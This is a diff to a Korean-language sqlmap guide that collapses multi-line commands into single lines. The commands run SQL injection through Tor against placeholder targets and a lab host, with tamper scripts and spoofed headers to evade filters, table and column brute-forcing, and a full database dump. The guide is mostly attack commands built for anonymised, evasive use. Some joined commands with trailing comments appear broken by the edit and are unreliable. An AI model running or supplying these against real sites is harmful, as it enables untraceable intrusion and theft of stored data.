@@ -86,9 +86,7 @@ sqlmap -u "http://example.com/page.php?id=1" --batch
 ### 최소 구성
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --batch
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor --batch
 ```
 
 ### 옵션 설명:
@@ -105,14 +103,7 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### 익명성 강화 설정
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 --check-tor \
-  --random-agent \
-  --delay=3 \
-  --timeout=30 \
-  --retries=3 \
-  --hex \
-  --output-dir=/tmp/sqlmap_tor_results
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor --random-agent --delay=3 --timeout=30 --retries=3 --hex --output-dir=/tmp/sqlmap_tor_results
 ```
 
 ### 옵션 상세:
@@ -131,22 +122,13 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### 시나리오 1: POST 데이터 대상 테스트
 
 ```bash
-sqlmap -u "http://example.com/login.php" \
-  --data="username=admin&password=123" \
-  --tor --tor-type=SOCKS5 \
-  --method=POST \
-  --level=5 \
-  --risk=3
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=123" --tor --tor-type=SOCKS5 --method=POST --level=5 --risk=3
 ```
 
 ### 시나리오 2: 쿠키 인증이 필요한 페이지
 
 ```bash
-sqlmap -u "http://example.com/dashboard.php" \
-  --cookie="PHPSESSID=1234567890abcdef; security=high" \
-  --tor --tor-type=SOCKS5 \
-  --batch \
-  --dbs
+sqlmap -u "http://example.com/dashboard.php" --cookie="PHPSESSID=1234567890abcdef; security=high" --tor --tor-type=SOCKS5 --batch --dbs
 ```
 
 ### 시나리오 3: 파일 기반 대상 테스트 (여러 URL)
@@ -158,10 +140,7 @@ echo "http://example.com/page2.php?user=2" >> urls.txt
 echo "http://example.com/search?q=test" >> urls.txt
 
 # 명령어 실행
-sqlmap -m urls.txt \
-  --tor --tor-type=SOCKS5 \
-  --threads=2 \
-  --smart
+sqlmap -m urls.txt --tor --tor-type=SOCKS5 --threads=2 --smart
 ```
 
 ---
@@ -177,20 +156,13 @@ git clone --depth 1 https://github.com/danielmiessler/SecLists.git
 ### 테이블 이름 브루트포싱
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --common-tables \
-  -t ./SecLists/Discovery/Web-Content/common-tables.txt \
-  --threads=2
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --common-tables -t ./SecLists/Discovery/Web-Content/common-tables.txt --threads=2
 ```
 
 ### 컬럼 이름 브루트포싱
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --columns \
-  -c ./SecLists/Discovery/Web-Content/common-columns.txt
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --columns -c ./SecLists/Discovery/Web-Content/common-columns.txt
 ```
 
 ---
@@ -200,21 +172,13 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### TAMPER 스크립트 조합
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --tamper=space2comment,charencode,randomcase \
-  --level=5 \
-  --risk=3
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --tamper=space2comment,charencode,randomcase --level=5 --risk=3
 ```
 
 ### 헤더 조작을 통한 우회
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --random-agent \
-  --headers="X-Forwarded-For:127.0.0.1\nX-Real-IP:127.0.0.1" \
-  --eval="import random; print('X-Custom-Header: %d' % random.randint(1000,9999))"
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --random-agent --headers="X-Forwarded-For:127.0.0.1\nX-Real-IP:127.0.0.1" --eval="import random; print('X-Custom-Header: %d' % random.randint(1000,9999))"
 ```
 
 ---
@@ -224,12 +188,7 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### MySQL 대상 공격
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --dbms=mysql \
-  --common-tables \
-  -t ./SecLists/Discovery/Web-Content/MySQL.txt \
-  --hex
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --dbms=mysql --common-tables -t ./SecLists/Discovery/Web-Content/MySQL.txt --hex
 
 sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
 ```
@@ -237,12 +196,7 @@ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
 ### Oracle 대상 공격
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --dbms=oracle \
-  --common-tables \
-  -t ./SecLists/Discovery/Web-Content/Oracle.txt \
-  --no-escape
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --dbms=oracle --common-tables -t ./SecLists/Discovery/Web-Content/Oracle.txt --no-escape
 ```
 
 ---
@@ -252,16 +206,13 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### 세션 저장
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --session=example_session
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --session=example_session
 ```
 
 ### 세션 재개
 
 ```bash
-sqlmap --session=example_session \
-  --tor --tor-type=SOCKS5
+sqlmap --session=example_session --tor --tor-type=SOCKS5
 ```
 
 ---
@@ -271,9 +222,7 @@ sqlmap --session=example_session \
 ### Tor 네트워크 특성 고려
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --threads=2 \          # 낮은 스레드 수 유지
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --threads=2 \          # 낮은 스레드 수 유지
   --delay=5 \            # 높은 딜레이 설정
   --timeout=60 \         # 긴 타임아웃 설정
   --retries=5 \          # 재시도 횟수 증가
@@ -283,12 +232,7 @@ sqlmap -u "http://example.com/page.php?id=1" \
 ### 랜덤 지연 적용
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" \
-  --tor --tor-type=SOCKS5 \
-  --delay=3 --time-sec=5 \
-  --randomize=length \
-  --safe-url="http://example.com/" \
-  --safe-freq=10
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --delay=3 --time-sec=5 --randomize=length --safe-url="http://example.com/" --safe-freq=10
 ```
 
 ---
@@ -514,8 +458,7 @@ Out-of-band 테스트
 ### 진정한 "완전 자동화"를 위한 확장 명령어
 
 ```bash
-sqlmap -u "http://example.com/page.php?id=1" --batch \
-  --dump-all  # 모든 DB/테이블 덤프
+sqlmap -u "http://example.com/page.php?id=1" --batch --dump-all  # 모든 DB/테이블 덤프
   --exclude-sysdbs  # 시스템 DB 제외
   --flush-session  # 이전 세션 무시
 ```
